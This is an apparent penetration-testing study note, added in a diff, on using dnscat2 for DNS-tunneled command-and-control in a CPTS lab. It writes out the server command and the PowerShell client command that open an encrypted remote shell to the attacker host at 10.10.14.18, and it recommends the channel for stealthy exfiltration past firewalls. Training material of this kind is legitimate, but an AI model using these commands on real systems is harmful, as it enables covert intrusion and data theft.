@@ -1,0 +1,74 @@
+🔁 What is Dnscat2 and Why Use It?
+Dnscat2 is covert command-and-control over DNS. It tunnels data using DNS TXT records, so it blends into normal DNS traffic and can slip past a lot of perimeter defenses and firewalls — especially in locked-down corporate environments where:
+
+ICMP is blocked
+
+HTTP/S is filtered
+
+Outbound connections are restricted to known ports
+
+This is your James Bond C2 — silent, sneaky, and elegant.
+
+🧠 Why Is It Useful in Engagements or Exams?
+No port forwarding required: DNS is almost always allowed out of the environment.
+
+Can bypass restrictive firewalls: Even if RDP, SSH, or HTTPS is locked, DNS might still get out.
+
+You get a shell: Encrypted. Authenticated. Routed through DNS.
+
+Alternative to Meterpreter: If your Meterpreter shell dies, or you want stealthier recon or exfil, this is gold.
+
+🛠️ Basic Flow Recap
+✅ On your attack box:
+Clone the repo & install dependencies.
+
+Start the server:
+
+bash
+Copy
+Edit
+sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache
+✅ On the Windows target:
+Transfer & import dnscat2.ps1.
+
+Run it:
+
+powershell
+Copy
+Edit
+Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret <secret> -Exec cmd
+🔒 That -PreSharedSecret ensures encryption. If it's wrong — no shell.
+
+✅ Back on your server:
+You’ll see:
+
+bash
+Copy
+Edit
+Session 1 Security: ENCRYPTED AND VERIFIED!
+Then just:
+
+bash
+Copy
+Edit
+window -i 1
+and you’re in like it’s 1999.
+
+🧠 When Should You Think About DNS Tunneling?
+You can’t get a reverse shell or it dies mid-pivot.
+
+Firewalls block everything except DNS (UDP 53).
+
+You want a stealthier channel to recon or exfil.
+
+You compromised a box in a heavily monitored network.
+
+You just feel like being a sexy hacker ninja.
+
+❗Things to Know for CPTS
+You likely won’t need this for the exam unless you're improvising around broken port forwards or tight egress filtering.
+
+But you will impress yourself or your future team if you use it during real-world ops when traditional comms fail.
+
+Just memorize the general setup → transfer → shell flow. You don’t need to know every dnscat2 command.
+
